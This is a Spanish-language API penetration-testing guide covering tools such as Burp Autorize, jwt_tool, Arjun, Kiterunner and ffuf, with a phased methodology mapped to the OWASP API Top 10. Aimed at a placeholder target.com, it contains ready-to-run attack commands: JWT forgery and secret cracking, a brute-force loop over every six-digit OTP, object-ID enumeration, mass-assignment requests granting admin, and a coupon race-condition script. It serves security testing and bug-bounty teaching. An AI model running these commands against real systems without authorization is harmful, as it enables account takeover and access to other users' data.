# Herramientas y Metodología

### Herramientas esenciales

#### Burp Suite — Base del API testing

```
Configuración específica para APIs:

1. Proxy → Options → Add scope: target.com/api/*
   → Solo captura tráfico de la API, no del frontend

2. Extensions imprescindibles para APIs:
   → Autorize: detecta BOLA/BFLA automáticamente
   → InQL: testing completo de GraphQL
   → JWT Editor: modifica y re-firma JWT
   → Param Miner: descubre parámetros y cabeceras ocultas
   → 403 Bypasser: intenta bypasses de 403 automáticamente

3. Match & Replace rules útiles:
   → Reemplazar token de sesión automáticamente en todas las peticiones
   → Añadir cabecera X-Forwarded-For: RANDOM en cada petición
```

**Autorize — BOLA automático**

```
1. BApp Store → instalar Autorize
2. En Autorize → "Cookie/Header for low-priv user":
   Authorization: Bearer TOKEN_LOW_PRIV
3. Navegar la app con cuenta de alto privilegio
4. Autorize repite cada petición con el token de bajo privilegio
5. Columnas:
   → "Orig": respuesta original (alto privilegio)
   → "Modified": respuesta con token bajo
   → "Authz": Bypassed! / Is Enforced / Not Enforced
6. Filtrar por "Bypassed!" → todos los BOLA encontrados
```

**JWT Editor**

```
1. Capturar petición con JWT → clic derecho → Send to Repeater
2. En Repeater → pestaña "JSON Web Token"
3. Modificar el payload directamente (role, userId...)
4. Opciones de ataque:
   → "None Algorithm": probar alg:none
   → "Embedded JWK": inyectar clave pública propia
   → "Copy Public Key as PEM": para RS256→HS256 confusion
5. Re-firmar con secreto conocido
```

#### Postman — Testing manual y colecciones

```bash
# Importar colección de la API (si está disponible)
# File → Import → URL de Swagger/OpenAPI

# Variables de entorno para testing
# {{base_url}} = https://target.com/api
# {{token_admin}} = eyJhbGciOiJIUzI1NiJ9...
# {{token_user}} = eyJhbGciOiJIUzI1NiJ9...
# {{user_id}} = 1042
# {{victim_id}} = 1043

# Tests automáticos en Postman (para BOLA)
// En la pestaña Tests de cada request:
pm.test("No BOLA - status should be 403", function() {
    pm.response.to.have.status(403);
});

pm.test("Response should not contain victim data", function() {
    var body = pm.response.text();
    pm.expect(body).to.not.include("victim@empresa.com");
});
```

#### Arjun — Descubrir parámetros ocultos

```bash
# Instalación
pip3 install arjun

# Descubrir parámetros GET ocultos
arjun -u https://target.com/api/users

# Descubrir parámetros POST (JSON)
arjun -u https://target.com/api/register --method POST

# Con headers de auth
arjun -u https://target.com/api/users \
    -H "Authorization: Bearer TOKEN"

# Con wordlist personalizada
arjun -u https://target.com/api/users \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Output: lista de parámetros que generan respuesta diferente
# Útil para mass assignment: cada parámetro descubierto = campo a probar
```

#### Kiterunner — Descubrimiento masivo de endpoints

```bash
# Instalación
go install github.com/assetnote/kiterunner/cmd/kr@latest

# Escaneo básico con routes built-in
kr scan https://target.com -w routes-large.kite

# Con wordlist de SecLists
kr scan https://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt

# Escanear múltiples hosts
kr scan targets.txt -w routes-large.kite

# Con autenticación
kr scan https://target.com \
    -w routes-large.kite \
    -H "Authorization: Bearer TOKEN"

# Kiterunner prueba métodos GET, POST, PUT, DELETE en cada ruta
# Output: lista de endpoints que responden con 2xx/3xx
```

#### ffuf — Fuzzing de API endpoints

```bash
# Descubrir endpoints
ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
    -mc 200,201,401,403 \
    -c -v

# Descubrir versiones de API
ffuf -u https://target.com/api/FUZZ/users \
    -w versions.txt \     # v1, v2, v3, beta, legacy...
    -mc 200,401

# Fuzzing de parámetros
ffuf -u "https://target.com/api/users?FUZZ=1042" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 \
    -fs 0    # filtrar respuestas vacías

# Fuzzing de BOLA (IDs)
ffuf -u https://target.com/api/users/FUZZ \
    -w <(seq 1 5000) \
    -H "Authorization: Bearer TOKEN" \
    -mc 200 \
    -o bola_results.json
```

#### jwt\_tool — Testing completo de JWT

```bash
# Instalación
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Analizar el JWT
python3 jwt_tool.py TOKEN

# Scan completo contra un endpoint
python3 jwt_tool.py TOKEN \
    -t https://target.com/api/users/me \
    -rh "Authorization: Bearer TOKEN" \
    -M pb    # playbook: prueba todos los ataques

# Ataques específicos
python3 jwt_tool.py TOKEN -X a        # alg:none
python3 jwt_tool.py TOKEN -X n        # null signature
python3 jwt_tool.py TOKEN -X i        # inject JWKS
python3 jwt_tool.py TOKEN -X k -pk pub.pem  # RS256→HS256

# Crackear secreto
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# Modificar payload (interactivo)
python3 jwt_tool.py TOKEN -T -S hs256 -p "secreto"
```

#### graphql-cop — Auditoría de GraphQL

```bash
# Instalación
pip3 install graphql-cop

# Auditoría básica
graphql-cop -t https://target.com/graphql

# Con autenticación
graphql-cop -t https://target.com/graphql \
    -H "Authorization: Bearer TOKEN"

# Output: lista de issues encontrados:
# ✓ Introspection enabled
# ✓ Batch queries supported
# ✓ Alias overloading possible
# ✓ Deep recursion allowed
# ✗ Field suggestion disabled
# ✓ GET queries enabled
```

### Metodología completa de API pentesting

#### Fase 1 — Reconocimiento

```bash
# 1. Encontrar la documentación
curl https://target.com/swagger.json
curl https://target.com/api-docs
curl https://target.com/openapi.json
# Si no hay doc → fuzzing con kiterunner

# 2. Mapear todos los endpoints
# Importar Swagger en Postman/Burp
# Navegar la app con Burp Proxy activo
# Analizar el JS para endpoints no documentados

# 3. Identificar el esquema de autenticación
# ¿JWT? ¿API Key? ¿OAuth? ¿Session cookie?
# ¿Cómo se renueva el token?
# ¿Qué roles existen?
```

#### Fase 2 — Autenticación (API2)

```bash
# Registrar 2 cuentas de distinto nivel
# Obtener tokens para ambas
# Verificar configuración JWT
python3 jwt_tool.py TOKEN -M pb -t https://target.com/api/users/me \
    -rh "Authorization: Bearer TOKEN"

# Probar rate limiting en login
for i in $(seq 1 50); do
    curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/api/auth/login \
        -d '{"email":"test@test.com","password":"wrong"}'
done
```

#### Fase 3 — Autorización (API1 + API5)

```bash
# Configurar Autorize con token de bajo privilegio
# Navegar con cuenta de alto privilegio
# Analizar resultados: ¿qué endpoints son accesibles sin autorización?

# Manual: probar IDs de la otra cuenta
for i in $(seq 1040 1050); do
    r=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer TOKEN_A" \
        https://target.com/api/users/$i)
    echo "ID $i: $r"
done

# Probar endpoints de admin con token de usuario normal
for endpoint in admin staff management internal debug; do
    r=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer TOKEN_NORMAL" \
        https://target.com/api/v1/$endpoint/users)
    echo "/api/v1/$endpoint/users: $r"
done
```

#### Fase 4 — Propiedades de objetos (API3)

```bash
# Comparar campos de GET vs campos aceptados en PUT/POST
# Arjun para descubrir campos ocultos
arjun -u https://target.com/api/users/1042 --method PUT \
    -H "Authorization: Bearer TOKEN"

# Probar mass assignment en registro
curl -X POST https://target.com/api/register \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"pass","role":"admin","is_admin":true,"verified":true}'
```

#### Fase 5 — Rate Limiting y Business Logic (API4 + API6)

```bash
# Verificar rate limiting en endpoints críticos
# OTP bruteforce
for code in $(seq -f "%06g" 0 999999); do
    r=$(curl -s -X POST https://target.com/api/auth/verify-otp \
        -d "{\"code\": \"$code\"}" | jq -r '.success')
    [ "$r" = "true" ] && echo "[+] OTP: $code" && break
done

# Race condition en cupones
python3 -c "
import requests, concurrent.futures
h = {'Authorization': 'Bearer TOKEN'}
f = lambda _: requests.post('https://target.com/api/cart/coupon',
    headers=h, json={'code': 'DISCOUNT50'})
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    r = list(ex.map(f, range(20)))
print([x.status_code for x in r])
"
```

#### Fase 6 — Configuración y Shadow APIs (API8 + API9)

```bash
# CORS
for origin in "https://attacker.com" "null" "https://target.com.attacker.com"; do
    h=$(curl -s -I -H "Origin: $origin" https://target.com/api/users/me | grep -i acao)
    echo "$origin → $h"
done

# Versiones antiguas
for v in v0 v1 v2 beta legacy old; do
    r=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/api/$v/users)
    echo "/api/$v/: $r"
done

# Endpoints de debug
for ep in debug info status health actuator actuator/env; do
    r=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/api/$ep)
    echo "/api/$ep: $r"
done
```

### Listas de palabras para APIs

```bash
# Endpoints de API
/usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

# Parámetros
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Versiones de API
v0, v1, v2, v3, v4, v5, beta, alpha, legacy, old, dev, staging, test, internal

# Campos para mass assignment
role, is_admin, admin, superuser, staff, verified, email_verified,
balance, credits, plan, subscription, account_type, permissions,
two_factor_enabled, locked, active, password, api_key
```

### Referencias

| Recurso                      | URL                                                                                   |
| ---------------------------- | ------------------------------------------------------------------------------------- |
| OWASP API Security Top 10    | https://owasp.org/API-Security/editions/2023/en/0x00-header/                          |
| PortSwigger API testing      | https://portswigger.net/web-security/api-testing                                      |
| HackTricks API Pentesting    | https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting |
| PayloadsAllTheThings API     | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API                   |
| APIsecurity.io               | https://apisecurity.io                                                                |
| 31 Days of API Security Tips | https://github.com/smodnix/31-days-of-API-Security-Tips                               |

> El flujo más eficiente en un API pentest: Kiterunner para descubrir todos los endpoints → Autorize para detectar BOLA/BFLA automáticamente mientras navegas → jwt\_tool -M pb para probar todos los ataques JWT → Arjun para descubrir campos de mass assignment.

> En bug bounty de APIs, BOLA en endpoints de administración (acceder a datos de otros usuarios en rutas `/api/admin/`) es frecuentemente Critical porque combina BOLA con BFLA en un solo hallazgo.

> Siempre documentar todos los endpoints descubiertos antes de atacarlos. En APIs complejas es fácil perder el hilo. Un Google Sheet con columna endpoint, método, auth requerida, resultado del test es suficiente para organizarse.
